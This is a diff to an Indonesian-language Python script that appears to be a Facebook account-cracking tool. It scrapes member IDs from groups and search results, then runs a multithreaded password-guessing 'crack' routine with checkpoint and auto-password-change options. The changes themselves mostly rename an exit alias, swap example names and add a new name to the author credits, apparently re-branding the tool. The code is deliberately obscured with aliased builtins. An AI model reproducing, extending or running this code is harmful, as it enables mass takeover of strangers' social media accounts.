@@ -32,7 +32,7 @@ _js_lo_    = json.loads
 _dvanme_ferly_    = print
 _cici_dapunta_    = input
 _dapunta_dapunta_ = open
-_cici_cici_       = exit
+_ferly_exit_      = exit
 
 ### Warna
 Z = "\x1b[0;90m" # Hitam
@@ -501,11 +501,11 @@ class dump_grup:
             for _cici_ in self._grup_:
                 try:self.url_grup = ("https://mbasic.facebook.com/browse/group/members/?id=%s"%(_cici_));self.exec_grup_saya();_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari Grup Saya"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
                 except KeyboardInterrupt:_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari Grup Saya"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
-                except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+                except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_ferly_exit_()
         except (KeyError,IOError):jalan('%s╚══[%s!%s] %sCookie Invalid'%(M,P,M,P));menu()
         except requests.exceptions.ConnectionError:jalan('%s╚══[%s!%s] %sKoneksi Bermasaah'%(M,P,M,P));menu()
         except KeyboardInterrupt:_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari Grup Saya"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
-        except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+        except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_ferly_exit_()
     def exec_grup_saya(self):
         global count
         with _req_ses_ as ses_:
@@ -518,7 +518,7 @@ class dump_grup:
                 _dvanme_ferly_("\r%s╠══[%s•%s] %sSedang Mengambil %s ID"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
                 if "Lihat Selengkapnya" in str(sop_dev):url = sop_dev.find("a", string="Lihat Selengkapnya")["href"];url_grup = "https://mbasic.facebook.com"+url;self.exec_grup_saya()
             except KeyboardInterrupt:_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari Grup Saya"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
-            except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+            except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_ferly_exit_()
     def manual(self):
         id=_cici_dapunta_("%s╠══[%s•%s] %sMasukkan ID Grup : "%(O,P,O,P))
         if id=="":jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
@@ -531,11 +531,11 @@ class dump_grup:
                 elif xd in ['i','I','1']:
                     try:self.dump_id("https://m.facebook.com/groups/"+id);_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                     except KeyboardInterrupt:_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
-                    except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+                    except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_ferly_exit_()
                 elif xd in ['u','U','2']:
                     try:self.dump_username("https://m.facebook.com/groups/"+id);_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                     except KeyboardInterrupt:_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
-                    except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+                    except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_ferly_exit_()
                 else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()    
     def search(self):
         whitelist=[];q=_cici_dapunta_('%s╠══[%s•%s] %sNama : '%(O,P,O,P)).lower()
@@ -552,14 +552,14 @@ class dump_grup:
             elif xd in ['i','I','1']:
                 try:self.dump_id("https://m.facebook.com/groups/"+self.listed.get("id"));_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                 except KeyboardInterrupt:_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
-                except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+                except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_ferly_exit_()
             elif xd in ['u','U','2']:
                 try:self.dump_username("https://m.facebook.com/groups/"+self.listed.get("id"));_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                 except KeyboardInterrupt:_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
-                except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+                except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_ferly_exit_()
             else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
         except KeyboardInterrupt:_dvanme_ferly_("\n%s╠══[%s•%s] %sBerhasil Dump %s ID Dari %s"%(O,P,O,P,len(_dapunta_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
-        except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
+        except Exception as _error_:_dvanme_ferly_('\n%s╚══[%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_ferly_exit_()
     def f(self,id):
         self.fl=(id.replace(' ','_')+'.json')
         if self.fl=='':self.f()
@@ -672,14 +672,14 @@ class dump_pesan:
 
 ### Dump ID From Files
 def dump_file():
-    _dvanme_ferly_("%s╠══[%s•%s] %sContoh : /sdcard/dapunta.json"%(O,P,O,P));_files_ = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan Nama File : "%(O,P,O,P));_sekat_ = _cici_dapunta_("%s╠══[%s•%s] %sPemisah ID & Nama : "%(O,P,O,P))
+    _dvanme_ferly_("%s╠══[%s•%s] %sContoh : /sdcard/dvanmeploph.json"%(O,P,O,P));_files_ = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan Nama File : "%(O,P,O,P));_sekat_ = _cici_dapunta_("%s╠══[%s•%s] %sPemisah ID & Nama : "%(O,P,O,P))
     try:_baca_ = _dapunta_dapunta_(_files_,'r').read();_buku_ = _baca_.replace(_sekat_,'•');_dapunta_dapunta_(_files_,'w').write(_buku_)
     except:jalan('%s╚══[%s!%s] %sFile Tidak Ditemukan'%(M,P,M,P));menu()
     return crack(_files_)
 
 ### Dump ID From Email
 def dump_email():
-    _dvanme_ferly_("%s╠══[%s•%s] %sContoh : Dapunta Khurayra"%(O,P,O,P));_query_ = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan Nama : "%(O,P,O,P)).lower()
+    _dvanme_ferly_("%s╠══[%s•%s] %sContoh : Dvanmeploph Ferly"%(O,P,O,P));_query_ = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan Nama : "%(O,P,O,P)).lower()
     if len(_query_) < 3:jalan('%s╚══[%s!%s] %sNama Harus Lebih Dari 2 Digit'%(M,P,M,P));time.sleep(2);menu()
     _dvanme_ferly_("%s╠══[%s•%s] %sContoh : gmail.com"%(O,P,O,P));_domain_ = _cici_dapunta_("%s╠══[%s•%s] %sMasukkan Domain : "%(O,P,O,P)).lower()
     if '@' in _domain_:_domain_ = _domain_.split('@')[1]
@@ -1314,8 +1314,8 @@ class crack:
                     except:pass
                     _dvanme_ferly_('%s║'%(O));puf = _cici_dapunta_('%s╠══[%s•%s] %sMunculkan Opsi CP? [y/t] : '%(O,P,O,P))
                     if puf in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
-                    elif puf in ['1','01','001','y','Y']:auto_ganti_pass('Ya');cok = open('opsi_cp.txt','w');cok.write('opsi_cp');cok.close();started();ThreadPool(35).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_();break
-                    elif puf in ['2','02','002','t','T']:auto_ganti_pass('Tidak');cok = open('opsi_cp.txt','w');cok.write('null');cok.close();started();ThreadPool(35).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_();break
+                    elif puf in ['1','01','001','y','Y']:auto_ganti_pass('Ya');cok = open('opsi_cp.txt','w');cok.write('opsi_cp');cok.close();started();ThreadPool(35).map(self.start_crack,self.fl);os.remove(self.apk);_ferly_exit_();break
+                    elif puf in ['2','02','002','t','T']:auto_ganti_pass('Tidak');cok = open('opsi_cp.txt','w');cok.write('null');cok.close();started();ThreadPool(35).map(self.start_crack,self.fl);os.remove(self.apk);_ferly_exit_();break
                     else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
                 except Exception as e:_dvanme_ferly_(("   %s"%e))
     def pwlist(self):
@@ -1327,8 +1327,8 @@ class crack:
             except:pass
             _dvanme_ferly_('%s║'%(O));puf = _cici_dapunta_('%s╠══[%s•%s] %sMunculkan Opsi CP? [y/t] : '%(O,P,O,P))
             if puf in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
-            elif puf in ['1','01','001','y','Y']:auto_ganti_pass('Ya');cok = open('opsi_cp.txt','w');cok.write('opsi_cp');cok.close();started();ThreadPool(30).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_()
-            elif puf in ['2','02','002','t','T']:auto_ganti_pass('Tidak');cok = open('opsi_cp.txt','w');cok.write('null');cok.close();started();ThreadPool(30).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_()
+            elif puf in ['1','01','001','y','Y']:auto_ganti_pass('Ya');cok = open('opsi_cp.txt','w');cok.write('opsi_cp');cok.close();started();ThreadPool(30).map(self.start_crack,self.fl);os.remove(self.apk);_ferly_exit_()
+            elif puf in ['2','02','002','t','T']:auto_ganti_pass('Tidak');cok = open('opsi_cp.txt','w');cok.write('null');cok.close();started();ThreadPool(30).map(self.start_crack,self.fl);os.remove(self.apk);_ferly_exit_()
             else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
     def start_crack(self,fl):
         try:
@@ -1538,6 +1538,7 @@ def var_author():
     mlaku('%s║     • %sFallen'%(O,P))
     mlaku('%s║     • %sHanifan'%(O,P))
     mlaku('%s║     • %sRizky Leviathan'%(O,P))
+    mlaku('%s║     • %sDvanmeploph Ferly'%(O,P))
     mlaku('%s║'%(O))
 def var_ugen():
     _dvanme_ferly_("%s╠══[%s1%s] %sDapatkan User Agent"%(O,P,O,P))
@@ -1595,7 +1596,7 @@ def kata_buat_perecode():
     _dvanme_ferly_('%s║'%(M))
     _dvanme_ferly_('%s╚══[ %sRegard Dapunta %s]%s'%(M,P,M,P))
     _dvanme_ferly_('%s'%(P))
-    _cici_cici_()
+    _ferly_exit_()
 
 ### Membuat Folder Direktori
 def folder():
